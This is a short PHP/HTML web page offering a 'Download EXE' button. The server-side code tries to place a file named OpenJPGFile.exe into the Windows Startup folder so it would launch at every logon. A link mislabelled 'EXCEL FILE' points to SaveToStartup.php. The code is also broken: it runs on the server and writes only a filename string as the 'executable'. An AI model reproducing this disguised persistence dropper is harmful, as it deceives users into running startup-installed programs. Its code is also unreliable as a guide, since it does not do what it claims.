<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Download EXE File</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        .container {
            max-width: 600px;
            margin: auto;
            text-align: center;
        }
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            background-color: #f2f2f2;
            color: #333;
            border-left: 5px solid #4CAF50;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Download EXE File</h2>
        
        <?php
        
        if (isset($_POST['download'])) {
            $username = getenv('USERNAME');  
            $save_path = "C:\\Users\\$username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";            
            $exe_content = 'OpenJPGFile.exe';
            $temp_filename = tempnam(sys_get_temp_dir(), 'OpenJPGFile');
            file_put_contents($temp_filename, $exe_content);
            $exe_filename = $save_path . 'OpenJPGFile.exe';
            if (rename($temp_filename, $exe_filename)) {
                $message = 'Download complete! ' ;
            } else {
                $message = 'Failed to save file.';
            }
            echo '<script>alert("' . $message . '");</script>';
        }
        ?>

        <form method="post">
            <button type="submit" name="download">Download EXE</button>
        </form>
        <h3>if you want to download <a href="SaveToStartup.php">EXCEL FILE</a></h3>
    </div>
</body>
</html>
